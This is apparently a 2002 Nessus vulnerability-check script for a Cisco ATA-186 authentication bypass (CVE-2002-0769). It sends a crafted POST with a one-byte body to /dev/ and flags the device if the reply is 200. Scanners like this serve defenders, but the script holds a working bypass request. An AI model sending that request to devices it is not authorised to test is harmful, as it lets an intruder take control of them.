#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11012);
 script_bugtraq_id(4711, 4712);
 script_version ("$Revision: 1.10 $");
 script_cve_id("CVE-2002-0769");
 
 name["english"] = "ATA-186 password circumvention / recovery";
 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to bypass the authentication mechanism of the remote
host by making POST requests with a single byte as a payload.

An attacker may use this flaw to take the control of this device

Solution : http://www.cisco.com/warp/public/707/ata186-password-disclosure.shtml

Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "CISCO check";
 script_summary(english:summary["english"]);
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison");
 family["english"] = "CISCO";
 family["francais"] = "CISCO";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "no404.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");


port = get_http_port(default:80);


if(!get_port_state(port))exit(0);


req1 = http_get(item:"/dev/", port:port);
req2 = http_post(item:"/dev/", port:port);

req2 = req2 - string("\r\n\r\n");
req2 = string(req2, "\r\nContent-length:1\r\n\r\na\r\n\r\n");
soc = http_open_socket(port);
if(soc)
{ 
 send(socket:soc, data:req1);
 r = recv_line(socket:soc, length:4096);
 http_close_socket(soc);
 if(!(ereg(pattern:"^HTTP[0-9]\.[0-9] 403 .*", string:r)))exit(0);
}
else exit(0);

soc = http_open_socket(port);
if(soc)
{ 
 send(socket:soc, data:req2);
 r = recv_line(socket:soc, length:4096);
 http_close_socket(soc);
 if(ereg(pattern:"^HTTP[0-9]\.[0-9] 200 ", string:r))security_hole(port);
}
else exit(0);




